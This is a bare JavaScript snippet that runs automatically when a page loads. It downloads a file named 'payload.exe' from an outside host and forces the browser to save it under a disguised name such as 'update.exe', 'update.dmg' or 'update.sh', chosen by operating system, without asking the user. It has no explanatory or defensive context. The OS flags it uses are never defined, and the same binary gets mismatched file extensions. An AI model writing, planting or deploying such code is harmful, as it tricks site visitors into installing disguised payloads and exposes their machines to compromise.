function downloadPayload() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://theserpentmaster.github.io/payload.exe', true);
    xhr.responseType = 'blob';
    xhr.onload = function() {
        if (xhr.status === 200) {
            var blob = xhr.response;
            var downloadLink = document.createElement('a');
            downloadLink.href = window.URL.createObjectURL(blob);
            
            // Customize the filename based on OS
            if (isWindows) {
                downloadLink.setAttribute('download', 'update.exe');
            } else if (isMac) {
                downloadLink.setAttribute('download', 'update.dmg');
            } else if (isLinux) {
                downloadLink.setAttribute('download', 'update.sh');
            }
            
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
        }
    };
    xhr.send();
}

// Trigger the download as soon as the page loads
window.onload = downloadPayload;